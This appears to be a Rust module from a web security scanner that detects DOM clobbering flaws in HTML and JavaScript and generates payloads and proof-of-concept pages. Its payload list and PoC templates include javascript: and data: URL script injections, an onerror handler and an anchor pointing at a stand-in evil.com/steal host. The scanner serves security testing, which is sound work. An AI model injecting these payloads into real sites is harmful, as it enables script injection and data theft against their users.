use std::collections::HashMap;
use std::fmt;

use regex::Regex;
use serde::{Deserialize, Serialize};

/// Severity of a DOM clobbering finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, PartialOrd, Ord)]
pub enum DomClobberingSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for DomClobberingSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Info => "info",
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
            Self::Critical => "critical",
        };
        write!(f, "{label}")
    }
}

/// Category of DOM clobbering vulnerability.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum DomClobberingType {
    /// Named element (id/name) overrides a global JS variable.
    NamedElementGlobalOverride,
    /// Form element clobbers a document property (e.g. document.forms, document.cookie).
    FormDocumentPropertyClobber,
    /// Anchor tag href clobbers toString() when used in string context.
    AnchorHrefClobber,
    /// Nested element clobbering via form→input chains (e.g. form#x → input name=y → x.y).
    NestedElementClobber,
    /// Element id collides with a builtin DOM API name.
    BuiltinApiShadow,
}

impl fmt::Display for DomClobberingType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::NamedElementGlobalOverride => "named-element-global-override",
            Self::FormDocumentPropertyClobber => "form-document-property-clobber",
            Self::AnchorHrefClobber => "anchor-href-clobber",
            Self::NestedElementClobber => "nested-element-clobber",
            Self::BuiltinApiShadow => "builtin-api-shadow",
        };
        write!(f, "{label}")
    }
}

/// A named HTML element found in the DOM that could participate in clobbering.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NamedElement {
    pub tag: String,
    pub id: Option<String>,
    pub name: Option<String>,
    pub href: Option<String>,
    pub line_hint: usize,
}

/// A JavaScript reference that might be clobbered by a named DOM element.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClobberTarget {
    pub variable_name: String,
    pub access_pattern: String,
    pub line_hint: usize,
    pub is_sensitive: bool,
}

/// A single DOM clobbering finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DomClobberingFinding {
    pub clobber_type: DomClobberingType,
    pub severity: DomClobberingSeverity,
    pub description: String,
    pub element_tag: String,
    pub clobbered_name: String,
    pub payload: Option<String>,
    pub poc_html: Option<String>,
}

/// Full analysis result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DomClobberingAnalysis {
    pub target_url: String,
    pub named_elements: Vec<NamedElement>,
    pub js_targets: Vec<ClobberTarget>,
    pub findings: Vec<DomClobberingFinding>,
    pub summary: DomClobberingSummary,
}

/// Summary statistics.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DomClobberingSummary {
    pub total_named_elements: usize,
    pub total_js_targets: usize,
    pub total_findings: usize,
    pub critical_count: usize,
    pub high_count: usize,
}

/// Configuration for DOM clobbering detection.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DomClobberingConfig {
    pub target_url: String,
    pub generate_payloads: bool,
    pub generate_poc: bool,
    pub check_nested: bool,
}

impl Default for DomClobberingConfig {
    fn default() -> Self {
        Self {
            target_url: String::new(),
            generate_payloads: true,
            generate_poc: true,
            check_nested: true,
        }
    }
}

impl DomClobberingConfig {
    pub fn with_target(mut self, url: &str) -> Self {
        self.target_url = url.to_string();
        self
    }

    pub fn with_payloads(mut self, enabled: bool) -> Self {
        self.generate_payloads = enabled;
        self
    }

    pub fn with_poc(mut self, enabled: bool) -> Self {
        self.generate_poc = enabled;
        self
    }
}

/// Well-known document properties that form elements can clobber.
const DOCUMENT_PROPERTIES: &[&str] = &[
    "cookie",
    "domain",
    "title",
    "body",
    "head",
    "images",
    "forms",
    "links",
    "scripts",
    "anchors",
    "embeds",
    "plugins",
    "location",
    "URL",
    "documentURI",
    "referrer",
    "lastModified",
    "readyState",
    "defaultView",
    "documentElement",
    "getElementById",
    "getElementsByName",
    "getElementsByClassName",
    "querySelector",
    "write",
];

/// Builtin browser globals that a named element's id could shadow.
const BUILTIN_GLOBALS: &[&str] = &[
    "alert",
    "confirm",
    "prompt",
    "open",
    "close",
    "print",
    "stop",
    "focus",
    "blur",
    "name",
    "location",
    "top",
    "parent",
    "self",
    "frames",
    "history",
    "navigator",
    "screen",
    "status",
    "toolbar",
    "menubar",
    "scrollbars",
    "length",
    "origin",
    "fetch",
    "toString",
    "valueOf",
];

/// Extract all named HTML elements (id/name attributes) from an HTML source.
pub fn extract_named_elements(html_source: &str) -> Vec<NamedElement> {
    let mut elements = Vec::new();

    let tag_re = Regex::new(r#"(?si)<(\w+)\s+([^>]*(?:id|name)\s*=\s*(?:"[^"]*"|'[^']*')[^>]*)>"#)
        .expect("valid regex");

    let id_re = Regex::new(r#"(?i)id\s*=\s*(?:"([^"]*)"|'([^']*)')"#).expect("valid regex");
    let name_re = Regex::new(r#"(?i)name\s*=\s*(?:"([^"]*)"|'([^']*)')"#).expect("valid regex");
    let href_re = Regex::new(r#"(?i)href\s*=\s*(?:"([^"]*)"|'([^']*)')"#).expect("valid regex");

    for cap in tag_re.captures_iter(html_source) {
        let tag = cap[1].to_lowercase();
        let attrs = &cap[2];
        let offset = cap.get(0).map_or(0, |m| m.start());
        let line = html_source[..offset].matches('\n').count() + 1;

        let id = id_re
            .captures(attrs)
            .map(|c| {
                c.get(1)
                    .or_else(|| c.get(2))
                    .map(|m| m.as_str().to_string())
            })
            .flatten();

        let name = name_re
            .captures(attrs)
            .map(|c| {
                c.get(1)
                    .or_else(|| c.get(2))
                    .map(|m| m.as_str().to_string())
            })
            .flatten();

        let href = href_re
            .captures(attrs)
            .map(|c| {
                c.get(1)
                    .or_else(|| c.get(2))
                    .map(|m| m.as_str().to_string())
            })
            .flatten();

        elements.push(NamedElement {
            tag,
            id,
            name,
            href,
            line_hint: line,
        });
    }

    elements
}

/// Extract JavaScript variable references that could be clobbered by named elements.
/// Looks for bare global references and document property accesses.
pub fn extract_js_clobber_targets(js_source: &str) -> Vec<ClobberTarget> {
    let mut targets = Vec::new();
    let mut seen = std::collections::HashSet::new();

    let global_access_re = Regex::new(
        r#"(?m)(?:^|[=\s(,!&|?:;])(?:window\.)?(\w+)\.(?:value|href|src|textContent|innerHTML|action|data|text|toString)\b"#,
    )
    .expect("valid regex");

    for cap in global_access_re.captures_iter(js_source) {
        let var_name = cap[1].to_string();
        if is_js_keyword(&var_name) || seen.contains(&var_name) {
            continue;
        }
        seen.insert(var_name.clone());

        let offset = cap.get(0).map_or(0, |m| m.start());
        let line = js_source[..offset].matches('\n').count() + 1;
        let access = cap[0].trim().to_string();

        let sensitive = is_sensitive_context(js_source, &var_name);

        targets.push(ClobberTarget {
            variable_name: var_name,
            access_pattern: access,
            line_hint: line,
            is_sensitive: sensitive,
        });
    }

    let doc_prop_re = Regex::new(r"document\.(\w+)(?:\s*[=(]|\s*\.)").expect("valid regex");

    for cap in doc_prop_re.captures_iter(js_source) {
        let prop = cap[1].to_string();
        if seen.contains(&format!("document.{prop}")) {
            continue;
        }
        seen.insert(format!("document.{prop}"));

        if DOCUMENT_PROPERTIES.contains(&prop.as_str()) {
            let offset = cap.get(0).map_or(0, |m| m.start());
            let line = js_source[..offset].matches('\n').count() + 1;

            targets.push(ClobberTarget {
                variable_name: format!("document.{prop}"),
                access_pattern: cap[0].to_string(),
                line_hint: line,
                is_sensitive: matches!(
                    prop.as_str(),
                    "cookie" | "location" | "URL" | "domain" | "write"
                ),
            });
        }
    }

    targets
}

fn is_js_keyword(name: &str) -> bool {
    matches!(
        name,
        "var"
            | "let"
            | "const"
            | "function"
            | "return"
            | "if"
            | "else"
            | "for"
            | "while"
            | "do"
            | "switch"
            | "case"
            | "break"
            | "continue"
            | "new"
            | "this"
            | "typeof"
            | "instanceof"
            | "void"
            | "delete"
            | "try"
            | "catch"
            | "throw"
            | "finally"
            | "class"
            | "import"
            | "export"
            | "default"
            | "true"
            | "false"
            | "null"
            | "undefined"
            | "console"
            | "document"
            | "window"
            | "Math"
            | "JSON"
            | "Object"
            | "Array"
            | "String"
            | "Number"
            | "Boolean"
            | "Date"
            | "RegExp"
            | "Promise"
            | "Map"
            | "Set"
            | "Error"
            | "event"
    )
}

fn is_sensitive_context(js_source: &str, var_name: &str) -> bool {
    let sensitive_patterns = [
        format!(r"eval\s*\(\s*{var_name}"),
        format!(r"\.innerHTML\s*=\s*{var_name}"),
        format!(r"\.src\s*=\s*{var_name}"),
        format!(r"location\s*=\s*{var_name}"),
        format!(r"location\.href\s*=\s*{var_name}"),
        format!(r"\.href\s*=\s*{var_name}"),
        format!(r"fetch\s*\(\s*{var_name}"),
        format!(r"XMLHttpRequest.*{var_name}"),
        format!(r"document\.write\s*\(\s*{var_name}"),
        format!(r"script.*{var_name}"),
    ];

    for pat in &sensitive_patterns {
        if let Ok(re) = Regex::new(pat) {
            if re.is_match(js_source) {
                return true;
            }
        }
    }

    false
}

/// Detect named elements overriding global JS variables.
pub fn detect_global_overrides(
    elements: &[NamedElement],
    targets: &[ClobberTarget],
    config: &DomClobberingConfig,
) -> Vec<DomClobberingFinding> {
    let mut findings = Vec::new();

    let target_map: HashMap<&str, &ClobberTarget> = targets
        .iter()
        .filter(|t| !t.variable_name.contains('.'))
        .map(|t| (t.variable_name.as_str(), t))
        .collect();

    for elem in elements {
        for attr_name in [&elem.id, &elem.name].iter().copied().flatten() {
            if let Some(target) = target_map.get(attr_name.as_str()) {
                let severity = if target.is_sensitive {
                    DomClobberingSeverity::Critical
                } else {
                    DomClobberingSeverity::High
                };

                let payload = if config.generate_payloads {
                    Some(generate_global_override_payload(&elem.tag, attr_name))
                } else {
                    None
                };

                let poc = if config.generate_poc {
                    Some(generate_global_override_poc(
                        config,
                        &elem.tag,
                        attr_name,
                        &target.access_pattern,
                    ))
                } else {
                    None
                };

                findings.push(DomClobberingFinding {
                    clobber_type: DomClobberingType::NamedElementGlobalOverride,
                    severity,
                    description: format!(
                        "<{tag} id/name=\"{name}\"> at line ~{line} clobbers global `{name}` referenced at JS line ~{js_line} via `{access}`",
                        tag = elem.tag,
                        name = attr_name,
                        line = elem.line_hint,
                        js_line = target.line_hint,
                        access = target.access_pattern,
                    ),
                    element_tag: elem.tag.clone(),
                    clobbered_name: attr_name.clone(),
                    payload,
                    poc_html: poc,
                });
            }
        }
    }

    findings
}

/// Detect form elements clobbering document properties.
pub fn detect_form_document_clobber(
    elements: &[NamedElement],
    config: &DomClobberingConfig,
) -> Vec<DomClobberingFinding> {
    let mut findings = Vec::new();

    for elem in elements {
        if elem.tag != "form"
            && elem.tag != "input"
            && elem.tag != "img"
            && elem.tag != "embed"
            && elem.tag != "object"
        {
            continue;
        }

        for attr_name in [&elem.id, &elem.name].iter().copied().flatten() {
            if DOCUMENT_PROPERTIES.contains(&attr_name.as_str()) {
                let severity = match attr_name.as_str() {
                    "cookie" | "location" | "write" | "URL" | "domain" => {
                        DomClobberingSeverity::Critical
                    }
                    "getElementById"
                    | "querySelector"
                    | "getElementsByName"
                    | "getElementsByClassName" => DomClobberingSeverity::High,
                    _ => DomClobberingSeverity::Medium,
                };

                let payload = if config.generate_payloads {
                    Some(generate_form_clobber_payload(&elem.tag, attr_name))
                } else {
                    None
                };

                let poc = if config.generate_poc {
                    Some(generate_form_clobber_poc(config, &elem.tag, attr_name))
                } else {
                    None
                };

                findings.push(DomClobberingFinding {
                    clobber_type: DomClobberingType::FormDocumentPropertyClobber,
                    severity,
                    description: format!(
                        "<{tag} name=\"{name}\"> at line ~{line} clobbers document.{name}",
                        tag = elem.tag,
                        name = attr_name,
                        line = elem.line_hint,
                    ),
                    element_tag: elem.tag.clone(),
                    clobbered_name: attr_name.clone(),
                    payload,
                    poc_html: poc,
                });
            }
        }
    }

    findings
}

/// Detect anchor href clobbering — <a id="x" href="..."> makes x.toString() return the href.
pub fn detect_anchor_href_clobber(
    elements: &[NamedElement],
    targets: &[ClobberTarget],
    config: &DomClobberingConfig,
) -> Vec<DomClobberingFinding> {
    let mut findings = Vec::new();

    let target_names: HashMap<&str, &ClobberTarget> = targets
        .iter()
        .filter(|t| !t.variable_name.contains('.'))
        .map(|t| (t.variable_name.as_str(), t))
        .collect();

    for elem in elements {
        if elem.tag != "a" && elem.tag != "area" {
            continue;
        }

        if let Some(id) = &elem.id {
            if target_names.contains_key(id.as_str()) || elem.href.is_some() {
                let severity = if target_names
                    .get(id.as_str())
                    .map_or(false, |t| t.is_sensitive)
                {
                    DomClobberingSeverity::Critical
                } else {
                    DomClobberingSeverity::High
                };

                let payload = if config.generate_payloads {
                    Some(generate_anchor_clobber_payload(id))
                } else {
                    None
                };

                let poc = if config.generate_poc {
                    Some(generate_anchor_clobber_poc(config, id))
                } else {
                    None
                };

                findings.push(DomClobberingFinding {
                    clobber_type: DomClobberingType::AnchorHrefClobber,
                    severity,
                    description: format!(
                        "<a id=\"{id}\"> at line ~{line} — string coercion of `{id}` returns attacker-controlled href",
                        id = id,
                        line = elem.line_hint,
                    ),
                    element_tag: elem.tag.clone(),
                    clobbered_name: id.clone(),
                    payload,
                    poc_html: poc,
                });
            }
        }
    }

    findings
}

/// Detect nested element clobbering (form#x → input name=y makes x.y accessible).
pub fn detect_nested_clobber(
    html_source: &str,
    config: &DomClobberingConfig,
) -> Vec<DomClobberingFinding> {
    let mut findings = Vec::new();

    let nested_re = Regex::new(
        r#"(?si)<form\s+[^>]*id\s*=\s*(?:"([^"]*)"|'([^']*)')[^>]*>.*?<input\s+[^>]*name\s*=\s*(?:"([^"]*)"|'([^']*)').*?</form>"#,
    )
    .expect("valid regex");

    for cap in nested_re.captures_iter(html_source) {
        let form_id = cap.get(1).or_else(|| cap.get(2));
        let input_name = cap.get(3).or_else(|| cap.get(4));

        if let (Some(fid), Some(iname)) = (form_id, input_name) {
            let form_id_str = fid.as_str().to_string();
            let input_name_str = iname.as_str().to_string();
            let offset = cap.get(0).map_or(0, |m| m.start());
            let line = html_source[..offset].matches('\n').count() + 1;

            let payload = if config.generate_payloads {
                Some(format!(
                    "<form id=\"{form_id}\"><input name=\"{input_name}\"></form>",
                    form_id = form_id_str,
                    input_name = input_name_str,
                ))
            } else {
                None
            };

            let poc = if config.generate_poc {
                Some(generate_nested_clobber_poc(
                    config,
                    &form_id_str,
                    &input_name_str,
                ))
            } else {
                None
            };

            findings.push(DomClobberingFinding {
                clobber_type: DomClobberingType::NestedElementClobber,
                severity: DomClobberingSeverity::High,
                description: format!(
                    "form#{form_id} → input[name={input_name}] at line ~{line} enables `{form_id}.{input_name}` clobber chain",
                    form_id = form_id_str,
                    input_name = input_name_str,
                    line = line,
                ),
                element_tag: "form>input".to_string(),
                clobbered_name: format!("{form_id_str}.{input_name_str}"),
                payload,
                poc_html: poc,
            });
        }
    }

    findings
}

/// Detect elements whose id shadows a builtin browser API.
pub fn detect_builtin_api_shadow(
    elements: &[NamedElement],
    config: &DomClobberingConfig,
) -> Vec<DomClobberingFinding> {
    let mut findings = Vec::new();

    for elem in elements {
        if let Some(id) = &elem.id {
            if BUILTIN_GLOBALS.contains(&id.as_str()) {
                let severity = match id.as_str() {
                    "location" | "top" | "parent" | "self" | "fetch" | "origin" => {
                        DomClobberingSeverity::Critical
                    }
                    "alert" | "confirm" | "prompt" | "open" | "close" | "name" => {
                        DomClobberingSeverity::High
                    }
                    _ => DomClobberingSeverity::Medium,
                };

                let payload = if config.generate_payloads {
                    Some(format!("<{tag} id=\"{id}\">", tag = elem.tag, id = id))
                } else {
                    None
                };

                findings.push(DomClobberingFinding {
                    clobber_type: DomClobberingType::BuiltinApiShadow,
                    severity,
                    description: format!(
                        "<{tag} id=\"{id}\"> at line ~{line} shadows builtin `window.{id}`",
                        tag = elem.tag,
                        id = id,
                        line = elem.line_hint,
                    ),
                    element_tag: elem.tag.clone(),
                    clobbered_name: id.clone(),
                    payload,
                    poc_html: None,
                });
            }
        }
    }

    findings
}

/// Run the full DOM clobbering analysis pipeline.
pub fn analyze_dom_clobbering(
    html_source: &str,
    js_source: &str,
    config: &DomClobberingConfig,
) -> DomClobberingAnalysis {
    let named_elements = extract_named_elements(html_source);
    let js_targets = extract_js_clobber_targets(js_source);

    let mut findings = Vec::new();

    findings.extend(detect_global_overrides(
        &named_elements,
        &js_targets,
        config,
    ));
    findings.extend(detect_form_document_clobber(&named_elements, config));
    findings.extend(detect_anchor_href_clobber(
        &named_elements,
        &js_targets,
        config,
    ));

    if config.check_nested {
        findings.extend(detect_nested_clobber(html_source, config));
    }

    findings.extend(detect_builtin_api_shadow(&named_elements, config));

    findings.sort_by(|a, b| b.severity.cmp(&a.severity));

    let critical_count = findings
        .iter()
        .filter(|f| f.severity == DomClobberingSeverity::Critical)
        .count();
    let high_count = findings
        .iter()
        .filter(|f| f.severity == DomClobberingSeverity::High)
        .count();

    let summary = DomClobberingSummary {
        total_named_elements: named_elements.len(),
        total_js_targets: js_targets.len(),
        total_findings: findings.len(),
        critical_count,
        high_count,
    };

    DomClobberingAnalysis {
        target_url: config.target_url.clone(),
        named_elements,
        js_targets,
        findings,
        summary,
    }
}

fn generate_global_override_payload(tag: &str, name: &str) -> String {
    format!("<{tag} id=\"{name}\"></{tag}>")
}

fn generate_global_override_poc(
    config: &DomClobberingConfig,
    tag: &str,
    name: &str,
    access: &str,
) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>DOM Clobbering — Global Override PoC</title></head>
<body>
<h1>DOM Clobbering: &lt;{tag} id="{name}"&gt; overrides global `{name}`</h1>
<p>Target: {target}</p>
<{tag} id="{name}"></{tag}>
<script>
// Before clobbering: {name} would be the JS variable
// After clobbering: {name} is now the DOM element
console.log("typeof {name}:", typeof {name});
console.log("{name}:", {name});
// Original code expected: {access}
// Now returns DOM element property instead of intended value
if (typeof {name} === "object") {{
    document.write("<h2 style='color:red'>CLOBBERED: {name} is now " + {name}.toString() + "</h2>");
}}
</script>
</body>
</html>"#,
        tag = tag,
        name = name,
        target = config.target_url,
        access = access,
    )
}

fn generate_form_clobber_payload(tag: &str, prop: &str) -> String {
    format!("<{tag} name=\"{prop}\"></{tag}>")
}

fn generate_form_clobber_poc(config: &DomClobberingConfig, tag: &str, prop: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>DOM Clobbering — Document Property PoC</title></head>
<body>
<h1>DOM Clobbering: &lt;{tag} name="{prop}"&gt; clobbers document.{prop}</h1>
<p>Target: {target}</p>
<{tag} name="{prop}"></{tag}>
<script>
console.log("document.{prop}:", document.{prop});
if (document.{prop} instanceof HTMLElement || document.{prop} instanceof HTMLCollection) {{
    document.write("<h2 style='color:red'>CLOBBERED: document.{prop} is " + typeof document.{prop} + "</h2>");
}}
</script>
</body>
</html>"#,
        tag = tag,
        prop = prop,
        target = config.target_url,
    )
}

fn generate_anchor_clobber_payload(name: &str) -> String {
    format!(
        "<a id=\"{name}\" href=\"javascript:alert(1)\"></a>",
        name = name,
    )
}

fn generate_anchor_clobber_poc(config: &DomClobberingConfig, name: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>DOM Clobbering — Anchor href PoC</title></head>
<body>
<h1>DOM Clobbering: &lt;a id="{name}" href="..."&gt; controls toString()</h1>
<p>Target: {target}</p>
<a id="{name}" href="javascript:alert(document.domain)"></a>
<script>
// Any code doing string coercion: "" + {name}  or `${{ {name} }}`
// now gets the href value instead of the expected variable content
var clobbered = "" + {name};
console.log("Clobbered value:", clobbered);
document.write("<h2 style='color:red'>toString() returns: " + clobbered + "</h2>");
</script>
</body>
</html>"#,
        name = name,
        target = config.target_url,
    )
}

fn generate_nested_clobber_poc(
    config: &DomClobberingConfig,
    form_id: &str,
    input_name: &str,
) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>DOM Clobbering — Nested Element PoC</title></head>
<body>
<h1>DOM Clobbering: form#{form_id} → input[name={input_name}]</h1>
<p>Target: {target}</p>
<form id="{form_id}">
    <input name="{input_name}" value="clobbered_value">
</form>
<script>
// Accessing {form_id}.{input_name} now returns the input element
console.log("{form_id}.{input_name}:", {form_id}.{input_name});
console.log("{form_id}.{input_name}.value:", {form_id}.{input_name}.value);
document.write("<h2 style='color:red'>{form_id}.{input_name} = " + {form_id}.{input_name}.value + "</h2>");
</script>
</body>
</html>"#,
        form_id = form_id,
        input_name = input_name,
        target = config.target_url,
    )
}

/// Generate a comprehensive set of DOM clobbering payloads for injection testing.
pub fn generate_clobbering_payloads(target_name: &str) -> Vec<String> {
    vec![
        format!(r#"<img id="{target_name}">"#),
        format!(r#"<form id="{target_name}"><input name="value" value="clobbered"></form>"#),
        format!(r#"<a id="{target_name}" href="javascript:alert(1)"></a>"#),
        format!(r#"<a id="{target_name}" href="https://evil.com/steal"></a>"#),
        format!(r#"<object id="{target_name}" data="javascript:alert(1)"></object>"#),
        format!(r#"<embed id="{target_name}" name="{target_name}" src="javascript:alert(1)">"#),
        format!(r#"<input id="{target_name}" value="clobbered">"#),
        format!(r#"<form id="{target_name}"><button name="submit">hijack</button></form>"#),
        format!(r#"<a id="{target_name}" href="data:text/html,<script>alert(1)</script>"></a>"#),
        format!(r#"<img name="{target_name}" src=x onerror="alert(1)">"#),
        format!(r#"<details id="{target_name}" open><summary>x</summary></details>"#),
        format!(r#"<output id="{target_name}">clobbered</output>"#),
    ]
}
